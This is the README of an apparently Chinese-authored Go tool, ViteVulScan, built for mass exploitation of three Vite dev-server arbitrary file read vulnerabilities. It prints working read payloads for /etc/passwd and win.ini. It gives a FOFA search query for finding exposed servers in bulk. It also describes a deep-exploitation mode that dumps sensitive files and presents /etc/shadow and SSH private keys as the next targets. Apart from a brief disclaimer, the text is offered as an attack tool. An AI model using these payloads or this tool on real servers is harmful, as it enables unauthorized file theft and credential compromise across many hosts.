# ViteVulScan

## 漏洞介绍
本项目涉及3个漏洞：CVE-2025-30208/CVE-2025-31125/CVE-2025-31486，都是关于Vite开发服务器任意文件读取漏洞，这三个漏洞覆盖面大且利用简单不受限制。

### 漏洞POC：
CVE-2025-30208：
>Windows: /@fs/C://Windows/win.ini?import&raw??
> 
> Linux: /@fs/etc/passwd?import&raw??

CVE-2025-31125
> Windows: /@fs/C://windows/win.ini?import&?inline=1.wasm?init
>
> Linux: /@fs/etc/passwd?import&?inline=1.wasm?init

CVE-2025-31486
> Windows: /@fs/x/x/x/vite-project/?/../../../../../C://windows/win.ini?import&?inline=1.wasm?init
> 
> Linux: /@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&?inline=1.wasm?init

路径中的/@fs可以不需要携带。

### Fofa测绘语法：
> body="/@vite/client"

## 工具使用介绍
### 工具特点
1. 可以联动fofa进行批量利用
2. 会解析存在漏洞的精确路径并进行深度利用
3. 充分利用 go 的并发功能，可以实现在短时间内对大量资产进行快速的批量探测

### 编译说明
go版本：`go 1.20以上版本`

进入到项目根目录

先同步一下依赖
> go mod tidy

然后编译项目
>  go build -o ViteVulScan -ldflags="-s -w" -trimpath .

` ./ViteVulScan`即可运行该脚本。

当然你也可以直接在项目根目录下运行该项目:
> go run . 

### 配置
脚本支持联动fofa搜索资产然后进行批量检测。

要想使用fofa，要确保app.ini文件和编译后的二进制文件在同一目录，并且需要修改config目录下的app.ini文件，其中的fofakey字段填上自己的fofakey，num是自己估摸要检测的大概资产数量。

如果你有针对该漏洞更好的fofa测绘语法，可以自行修改fofaQuery字段。

### 命令行参数介绍



> Usage of ./ViteVulScan:

| 参数                      |                                        描述                                        |
|-------------------------|:--------------------------------------------------------------------------------:|
| -cve                    | 使用哪个cve漏洞进行检测。支持CVE_2025_30208/CVE_2025_31125/CVE_2025_31486。默认使用CVE_2025_30208。 |
| -fofa                   |                        指定该参数后，会联动fofa测绘资产，对得到的目标资产进行批量检测                         |
| -u    \|    -url        |                                 指定单个url目标，对其进行检测                                 |
| -f     \|     -filename |                               指定一个文件名，批量检测其中的url地址                               |
| -e                      | 指定该参数后，会对检测存在漏洞的资产进行深度利用，读取各种可能存在的敏感文件并保存在本地。(请谨慎使用该功能，最好是对单个目标检测，也就是使用-u时加上该参数) |

### 说明

1. 批量检测一个文件中的所有目标URL，确保文件中每行一个URL即可，URL可以是包含http的完整URL，也可以是一个域名或者ip，比如：
   ````text
     http://example1.com 
     example2.com
     127.0.0.1
   ````
2. 当指定-fofa和-f参数进行检测后，会自动将存在漏洞的资产保存到当前文件下，文件名格式为"当下时间戳.csv"。 
3. 同时支持对linux和windows平台进行利用，利用的字典分别为dict目录下的linux_sensitive_path.txt和windows_sensitive_path.txt，如果有更多敏感路径，可以自己在相应的字典中进行添加。

### 示例

__示例 1：__联动 fofa 进行批量检测：

./ViteVulScan -fofa

![image-20250410145741383](https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250410145749802.png)

扫描结束后，会在 result 目录下看到保存利用成功的 url 的csv 文件，以时间戳为名：

![image-20250410151756704](https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250410151758397.png)

__示例 2：__针对存在漏洞的 url 进行深度利用：

./ViteVulScan -u example.com -e

![image-20250410150341952](https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250410150344090.png)

如果显示“利用成功”，可以查看result 目录，会有以扫描的 url 为名的目录，扫描出来的敏感文件内容都被解析成原本文件格式后保存到相应路径中，效果如下所示：

![image-20250410150836985](https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250410150838982.png)

以保存的 result/localhost:5173/etc/passwd 中内容为例，可以看到敏感信息的完整内容被保存下来，便于后续的利用（如果能读取到 /etc/shadow 或者是服务器的ssh 私钥，就可以进一步利用了）。

![image-20250410151044619](https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/20250410151045981.png)


# 免责声明
本工具仅用于安全研究和授权测试，请勿用于非法用途。使用本工具进行任何未经授权的测试所造成的后果由使用者自行承担。

# 更新
## 3月29日首次发布：
- 实现fofa进行资产搜集功能
- 实现用CVE_2025_30208漏洞进行批量验证
- 添加命令行解析功能
## 4月1日：
- 实现深度利用功能
## 4月2日：
- 添加对刚出来的CVE_2025_31125漏洞的验证。
## 4月9日
- 修改了 fofa 模块的错误。
- 添加了并发功能，支持快速批量探测资产是否存在漏洞。
- 添加了对 CVE_2025_31486的验证
- 修改了项目文件结构